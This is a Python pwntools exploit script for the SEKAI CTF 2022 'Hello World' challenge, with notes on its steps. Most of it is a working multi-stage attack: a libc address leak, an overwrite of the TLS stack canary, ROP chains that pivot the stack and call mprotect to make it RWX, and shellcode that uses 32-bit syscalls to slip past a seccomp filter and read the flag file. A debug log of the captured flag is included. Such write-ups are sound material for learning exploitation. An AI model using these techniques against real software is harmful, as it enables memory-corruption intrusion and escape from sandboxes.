#!/usr/bin/env python3

"""
This is exploit for the SEKAI CTF 2022 PWN Hello World challenge written by Disconnect3d from justCatTheFish

The exploit has few steps:
- leaks a libc address
- computes global canary/cookie address in tls
- uses buffer overflow to overwrite the canary and execute a very small ROP of 3 gadgets (as we can't do more)
- those 3 gadgets call a read(0, rsp - around 8000, 9000)
- this read will eventually read over current rsp, so it loads stage2 of the exploit
- the stage2 is another ROP which uses mprotect to set the stack memory page permissions to RWX
- we jump to this mprotected memory to execute stage3 of the exploit (this stage3 payload exists within the 9000 bytes read before)
- stage3 uses a shellcode that calls x86 syscalls since the challenge limits the syscalls we can execute
- the seccomp policy can be seen below, however, note that seccomp-tools incorrectly shows syscall numbers for I386 (x86-32) syscalls
- it turns out we can call those i386 syscalls: open, mmap, llseek, getdents, mmap2
- however, an i386 syscall uses 32-bit registers and pointers
- so we first call i386 mmap2 syscall to allocate memory
- we put file path in there
- we then can open the file with i386 syscall and read it with amd64 read syscall
- an additional difficulty was that we did not know the flag file name
- so we had to call getdents first on a open(".", O_READ|O_DIRECTORY) file descriptor
- and read the contents of that -- in one connection
- and then connect again to the challenge server and open the file the flag was located in

PS: The exploit below was just copy pasted here without much clearing etc. so you know, its ctf quality ;)

$ seccomp-tools dump ./setup

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x12 0xffffffff  if (A != 0xffffffff) goto 0023
 0005: 0x15 0x10 0x00 0x00000000  if (A == read) goto 0022
 0006: 0x15 0x0f 0x00 0x00000001  if (A == write) goto 0022
 0007: 0x15 0x0e 0x00 0x00000005  if (A == fstat) goto 0022
 0008: 0x15 0x0d 0x00 0x0000000a  if (A == mprotect) goto 0022
 0009: 0x15 0x0c 0x00 0x0000003c  if (A == exit) goto 0022
 0010: 0x15 0x0b 0x00 0x0000005a  if (A == chmod) goto 0022
 0011: 0x15 0x0a 0x00 0x0000008c  if (A == getpriority) goto 0022
 0012: 0x15 0x09 0x00 0x0000008d  if (A == setpriority) goto 0022
 0013: 0x15 0x08 0x00 0x000000c0  if (A == lgetxattr) goto 0022
 0014: 0x15 0x07 0x08 0x000000e6  if (A == clock_nanosleep) goto 0022 else goto 0023
 0015: 0x15 0x00 0x07 0x40000003  if (A != ARCH_I386) goto 0023
 0016: 0x20 0x00 0x00 0x00000000  A = sys_number
 0017: 0x15 0x04 0x00 0x00000005  if (A == fstat) goto 0022
 0018: 0x15 0x03 0x00 0x0000005a  if (A == chmod) goto 0022
 0019: 0x15 0x02 0x00 0x0000008c  if (A == getpriority) goto 0022
 0020: 0x15 0x01 0x00 0x0000008d  if (A == setpriority) goto 0022
 0021: 0x15 0x00 0x01 0x000000c0  if (A != lgetxattr) goto 0023
 0022: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0023: 0x06 0x00 0x00 0x00000000  return KILL
"""


# This exploit template was generated via:
# $ pwn template ./setup --host challs.ctf.sekai.team --port 4002
from pwn import *

from fcntl import ioctl
import struct
SIOCGIFMTU = 0x8921
SIOCSIFMTU = 0x8922

ifname = 'ens18'
ifr = ifname + '\x00'*(32-len(ifname))

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./setup')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.ctf.sekai.team'
port = int(args.PORT or 4002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
break main
command
patch clock_nanosleep 'ret'
end
continue
b install
continue
nextret
'''.format(**locals())
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if not line.startswith('#'))

def runthis():
    with start() as io: #env={'LD_PRELOAD': './libnosleep.so'})
        if args.REMOTE:
            # SET MTU
            mtu = 16000
            ifr = struct.pack('<16sH', ifname.encode(), mtu) + b'\x00'*14
            ifs = ioctl(io.sock, SIOCSIFMTU, ifr)
            mtu = struct.unpack('<H',ifs[16:18])[0]
            print("IFR=%r MTU=%r" % (ifs, mtu))

            # GET CURRENT MTU
            ifs = ioctl(io.sock, SIOCGIFMTU, ifr)
            mtu = struct.unpack('<H',ifs[16:18])[0]
            print("IFR=%r MTU=%r" % (ifs, mtu))

        # 'I accept the aggrement'
        io.recvuntil(b'> ')
        io.sendline(b'1')

        io.recvuntil(b'Install Hello World to: \x1B[0m')
        #if not args.REMOTE and not args.LOOP and not args.NOP:
        #    pause()  # USE TO ADJUST ADDR?, check it in rsi/rdi ptr
        PREFIX=b'A' * 24 # int(args.X or 1)
        io.send(PREFIX)

        io.recvuntil(b'Ready to install Hello World\n\x1B[0m')
        io.sendline(b'1')

        io.recvuntil(b'Current path: \x1B[0m')
        io.recvuntil(b'\x1B[0;32m')

        io.recvuntil(PREFIX)

        data = io.recvuntil(b'\x1B[0m', drop=True)
        print("DATA: %r" % data)

        # Stack address
        #stack_addr = BRUTE_BYTE + data  #<--- ADDR BYTE TO ADJUST :(
        #stack_addr += (8-len(stack_addr)) * b'\x00'
        #stack_addr = u64(stack_addr)

        libc_addr = data + (8-len(data)) * b'\x00'
        libc_addr = u64(libc_addr)
        libc_base = libc_addr - 0xed88e
        tls_page = libc_base - 0x3000
        global_canary_ea = tls_page + 0x768
        libseccomp_base = libc_base + 0x228000
        ldso_base = libc_base + 0x24c000

        print("LIBC ADDR:", hex(libc_addr))
        print("LIBC BASE:", hex(libc_base))
        print("TLS  ADDR:", hex(tls_page))
        print("GLOBAL CANARY EA:", hex(global_canary_ea))
        print("LIBSECCOMP BASE:", hex(libseccomp_base))
        print("LDSO BASE:", hex(ldso_base))

        override_8b_at = global_canary_ea
        new_canary = b'01234567'
        overwrite_with = new_canary  # new canary value

        print("WE WILL OVERRIDE UP TO 8B AT ->", hex(override_8b_at), "to", repr(overwrite_with))

        # ROP PAYLOAD
        rebase = lambda x: p64(libc_base + x)
        rebase_ldso = lambda x: p64(ldso_base + x)
        rebase_lsec = lambda x: p64(libseccomp_base + x)
        # Interesting gadget:
        cool_call = rebase(0x000000000016eba1) # mov rsi, rsp; mov rdi, rbp; call qword ptr [rax];
        cool_call = rebase(0x0000000000146260) # mov rsi, rsp; mov rdi, rbp; ror rax, 0x11; xor rax, qword ptr fs:[0x30]; mov qword ptr [rsp], 0; call rax;

        set_rax = rebase(0x0000000000049f10)  # pop rax; ret;
        sys_read = rebase(0x0000000000094eb4) # xor eax, eax; syscall;
        libc_debug_write = rebase(0x2E236)

        rax_wannabe = sys_read
        print("RAX WANNABE:", hex(u64(rax_wannabe)))
        rax_need_to_set = rol(rax_wannabe, 11)
        rax_need_to_set = xor(rax_need_to_set, new_canary)

        # Musimy np. zawolac syscall(0, rsp, duzobajtow), bo rax=0 wiec to zawola read()
        # rax mamy na zero wiec jest oki
        # rdi=fd = musimy ustawic na 0
        # rsi=mamy na stos, ale jakies 8000+ B od rsp - moze zostac
        # rcx=trzeba ustawic na sensowna wartosc bo jest 0xffff.. wiec nie przejdzie
        # ecx mamy zero
        """
 RAX  0x0                                                           # SYS_READ=0
 RBX  0x0
 RCX  0x0
 RDX  0xffffffff                                                    # set to 10000
 RDI  0x7ffd8d294b40 —▸ 0x7f0ec640ee40 (funlockfile) ◂— endbr64     # set to 0
 RSI  0x7ffd8d294c60 ◂— 0x4820666f6d305b1b                          # is ok?
 R8   0x4
 R9   0x0
 R10  0x557ad27cb017 ◂— 0x617963006d305b1b
 R11  0x246
 R12  0x7ffd8d296f58 —▸ 0x7ffd8d298331 ◂— '/home/dc/helloworld/setup'
 R13  0x557ad27cabb5 (main) ◂— push   rbp
 R14  0x0
 R15  0x7f0ec6628c40 (_rtld_global_ro) ◂— 0x50d0e00000000
*RBP  0x6464646464646464 ('dddddddd')
*RSP  0x7ffd8d296e18 —▸ 0x7f0ec6545793 ◂— or     ecx, esi
*RIP  0x557ad27cab67 (install+833) ◂— ret
        """

        rop = b''.join((
            b'd'*8, #p64(0x200), # new rbp
            rebase(0x0000000000120272), #: pop rdx; ret;
            p64(0x2600),
            rebase(0x00000000000dcb8c), #: xor edi, edi; syscall;
            #rebase(0x00000000000dbbb3), #: pop rcx; ret 0x13;
            #p64(0x4000),
            #rebase(0x000000000019c793), #: or ecx, esi; sub eax, ecx; ret;
            #rebase(0x00000000000243c6), #: xor edi, edi; or r10d, 0x40; mov eax, ecx; syscall;
            #rebase_ldso(0x000000000001fdf3), #: xor edx, edx; div rsi; cmp rax, rcx; je 0x1fde0; xor eax, eax; ret;
            #rebase(0x0000000000049e69), #: shl rdx, 0x20; or rax, rdx; ret;

            #rebase(0x000000000002dff0), #: xor edi, edi; mov eax, edx; syscall;
            #set_rax,
            #sys_read,  # set rax to this gadget addrs
            #rax_need_to_set,
            #cool_call, # CALL MAGIC XD
        ))

        payload = p64(override_8b_at)
        payload += b'a'*72
        assert len(payload) <= 80
        payload += new_canary
        payload += rop
        print("Len payload=", len(payload), "len rop=", len(rop))
        if 120-len(payload) > 0:
            payload += cyclic(120-len(payload))
        assert len(payload) <= 120, len(payload)

        #  RSI  0x7ffe4d846380 ◂— 0x6262626262626262 ('bbbbbbbb')
        # RSI points to inetresting buffer that we will want to use for stage3
        rop_ret = rebase(0x000000000002d9b9) #: ret;
        stage2_rop = b''.join((
            rebase(0x000000000005df18), #: mov rax, rsi; ret;
            rebase(0x000000000007bad0), #: mov r9, rax; pop r12; pop r13; mov rax, r9; pop r14; ret;
            p64(0x6161616161), # r12
            p64(0x6262626262), # r13
            p64(0x6363636363), # r14

            # sys_mprotect	unsigned long start	size_t len	unsigned long prot
            # rax=10, rdi=start, rsi=len, rdx=prot

            # Set rsi to page aligned memory
            # rsi is later copied to rdi as 'start' arg of mprotect
            rebase(0x0000000000049f10), #: pop rax; ret;
            p64(0xFFffFFffFFff000),
            rebase(0x00000000000bdb01), #: and rsi, rax; je 0xbda40; bsr rax, rsi; add rax, rdi; ret;

            # set rdi to rsi, so we use proper address
            rebase(0x00000000001b792a), #: mov rdi, rsi; bsr eax, eax; lea rax, [rdi + rax - 0x20]; ret;

            # set rsi=0x2000 (size)
            rebase(0x0000000000030081), #: pop rsi; ret;
            p64(0x4000),

            # set rdx=7 (RWX)
            rebase(0x0000000000120272), #: pop rdx; ret;
            p64(7),

            # set rax=10=SYS_MPROTECT
            rebase(0x0000000000049f10), #: pop rax; ret;
            p64(10),

            # EXECUTE mprotect!
            rebase(0x0000000000095196), #: syscall; ret;

            # Bring back rax=r9 == address of stage3 which was mprotected to RWX
            rebase(0x00000000000b462d), #: mov rax, r9; ret;

            # JUMP TO STAGE 3 :)
            rebase(0x000000000002e427), #: jmp rax;
        ))

        # mmap 2
        # arg0 (%ebx)	arg1 (%ecx)	arg2 (%edx)	arg3 (%esi)	arg4 (%edi)	arg5 (%ebp)
        # ebx = 0
        # ecx = 0x1000
        # edx = 7
        # esi = 34
        # edi = -1
        # ebp = 0
        sc = '''
        mov ebx, 0
        mov ecx, 0x1000
        mov edx, 7
        mov esi, 34
        mov edi, -1
        xor ebp, ebp
        mov rax, 192
        int 0x80
        '''

        sc_mmap = asm(sc, arch='amd64')

        if args.GET_FILE:
            FLAG = args.FLAG or './85c6ead8489c814ccc024c7054edf8e4.txt'
            save_flagfile = '\n'.join(f"mov byte ptr [rax+{i}], '{c}'" for i, c in enumerate(FLAG))
            stage3_rop = b''.join((
                sc_mmap,
                asm(save_flagfile, arch='amd64'),
                asm('mov byte ptr [rax+%d], 0' % len(FLAG), arch='amd64'),
                asm('''
                mov r9, rax
                /* SYSCALL ARGS ORDER ON X86: ebx, ecx, edx, esi, edi, ebp
                /* open(".", O_RDONLY|O_DIRECTORY) */
                mov ebx, eax
                mov ecx, 0
                mov eax, 5
                int 0x80
                mov r8, rax

                /* execute read syscall (fd=rdi=r8, rsi=buffer=rsp+0x100, rdx=64) */
                mov rdx, 64
                mov rdi, r8
                mov rsi, rsp
                add rsi, 0x100
                xor eax, eax
                syscall

                /* write */
                mov rdx, 64
                mov rsi, rsp
                add rsi, 0x100
                mov rdi, 1
                mov eax, 1
                syscall
                ''', arch='amd64'),

                asm('jmp $'),
            ))

        else:
            FLAG = '.' #args.FLAG or '/flag'
            save_flagfile = '\n'.join(f"mov byte ptr [rax+{i}], '{c}'" for i, c in enumerate(FLAG))
            stage3_rop = b''.join((
                sc_mmap,
                asm(save_flagfile, arch='amd64'),
                asm('mov byte ptr [rax+%d], 0' % len(FLAG), arch='amd64'),
                asm('''
                mov r9, rax
                /* SYSCALL ARGS ORDER ON X86: ebx, ecx, edx, esi, edi, ebp
                /* open(".", O_RDONLY|O_DIRECTORY) */
                mov ebx, eax
                mov ecx, 0x10000
                mov eax, 5
                int 0x80
                /*mov r8, rax*/

                /* getdents(fd, buf, BUF_SIZE); */
                mov ebx, eax    /* fd = open(".") */
                lea ecx, [r9+0x50]
                mov edx, 0x500
                mov eax, 141
                int 0x80

                mov rdi, 1
                lea rsi, [r9+0x50]
                mov rdx, 0x500
                mov rax, 1
                syscall
                jmp $

                /* execute read syscall (fd=rdi=r8, rsi=buffer=rsp+0x100, rdx=64) */
                mov rdx, 64
                mov rdi, r8
                mov rsi, rsp
                add rsi, 0x100
                xor eax, eax
                syscall

                /* write */
                mov rdx, 64
                mov rsi, rsp
                add rsi, 0x100
                mov rdi, 1
                mov eax, 1
                syscall
                ''', arch='amd64'),

                asm('jmp $'),
            ))

        #payload2 = asm(shellcraft.amd64.write(1, 'CZY TO DZIALA', len("CZY TO DZIALA")), arch='amd64')
        FLAG = args.FLAG or './5c6ead8489c814ccc024c7054edf8e4.txt'
        #payload2 = asm(shellcraft.amd64.chmod(FLAG, 0o777), arch='amd64')  # not needed
        payload2 = stage3_rop
        assert len(payload2) <= 8656
        payload2 += asm('nop', arch='amd64') * (8656-len(payload2)) #cyclic(8656-len(payload)) #b'a' * (8656-len(payload))
        payload2 += stage2_rop

        #payload2 = rop_ret * int((8800//8))
        #payload2 += libc_debug_write #asm('jmp $', arch='amd64')

        io.recvuntil(b'File name: \x1B[0m\x1B[0;36m')
        io.send(payload)
        io.recvuntil(b'\x1B[0m')
        io.recvuntil(b'Data: \x1B[0m')
        io.recvuntil(b'\x1B[0;36m')
        io.send(overwrite_with)
        io.recvuntil(b'--> Done')
        io.recvuntil(b'End of Hello World Setup Wizard')

        # No idea if needed
        #if args.REMOTE:
        #    io.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG, 16000)
        #    #io.sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAG, 1)
        #    io.sock.setsockopt(socket.SOL_IP, 10, 2)
        #    io.sock.send(payload2)

        io.send(payload2)

        io.interactive()

runthis()
exit(0)

if args.REMOTE or args.LOOP:
    i=0
    while True:
        try:
            print("Attempt %d" % i)
            runthis()
        except Exception:
            pass
        i += 1
else:
    runthis()

"""
FILE LISTING WITH getddents
[DEBUG] Received 0x500 bytes:
    00000000  03 e7 1f 00  01 00 00 00  10 00 2e 00  00 00 00 04  │····│····│··.·│····│
    00000010  06 e7 1f 00  02 00 00 00  14 00 2e 70  72 6f 66 69  │····│····│··.p│rofi│
    00000020  6c 65 00 08  04 e7 1f 00  03 00 00 00  18 00 2e 62  │le··│····│····│··.b│
    00000030  61 73 68 5f  6c 6f 67 6f  75 74 00 08  02 e7 1f 00  │ash_│logo│ut··│····│
    00000040  04 00 00 00  10 00 2e 2e  00 00 00 04  05 e7 1f 00  │····│··..│····│····│
    00000050  05 00 00 00  14 00 2e 62  61 73 68 72  63 00 00 08  │····│··.b│ashr│c···│
    00000060  07 e7 1f 00  06 00 00 00  30 00 38 35  63 36 65 61  │····│····│0·85│c6ea│
    00000070  64 38 34 38  39 63 38 31  34 63 63 63  30 32 34 63  │d848│9c81│4ccc│024c│
    00000080  37 30 35 34  65 64 66 38  65 34 2e 74  78 74 00 08  │7054│edf8│e4.t│xt··│
    00000090  09 e7 1f 00  07 00 00 00  14 00 73 65  74 75 70 00  │····│····│··se│tup·│
    000000a0  00 00 00 08  08 e7 1f 00  08 00 00 00  14 00 72 75  │····│····│····│··ru│
    000000b0  6e 2e 73 68  00 00 00 08  00 00 00 00  00 00 00 00  │n.sh│····│····│····│
    000000c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│


GETTING FLAG
    00002240  0a 00 00 00  00 00 00 00  96 41 35 71  06 7f 00 00  │····│····│·A5q│····│
    00002250  2d 36 37 71  06 7f 00 00  27 d4 2e 71  06 7f 00 00  │-67q│····│'·.q│····│
    00002260
[*] Switching to interactive mode

[DEBUG] Received 0x40 bytes:
    b'SEKAI{JusT_4_B@s1C_h3Ll0_W@rlD_aa5dab0c72a98a522d48cfe43944d41e}'
"""
